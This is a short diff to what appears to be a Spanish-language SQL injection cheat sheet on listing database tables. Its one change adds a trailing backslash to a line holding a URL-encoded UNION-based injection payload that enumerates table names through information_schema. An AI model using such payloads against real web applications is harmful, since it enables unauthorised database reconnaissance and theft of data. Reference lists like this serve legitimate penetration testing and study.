@@ -51,7 +51,7 @@ PostgreSQL >> SELECT version()
 
 ### LISTAR TABLAS DE LA BASE DE DATOS / [Microsoft/MySQL/PostgreSQL] 
 
-SELECT [columns] FROM information_schema.tables | '+UNION+SELECT+table_name,null+FROM+information_schema.tables-- 
+SELECT [columns] FROM information_schema.tables | '+UNION+SELECT+table_name,null+FROM+information_schema.tables-- \
 SELECT [columns] FROM information_schema.columns 
 
 SELECT [columns] FROM information_schema.columns WHERE table_name = 'users_qmwbqm' 
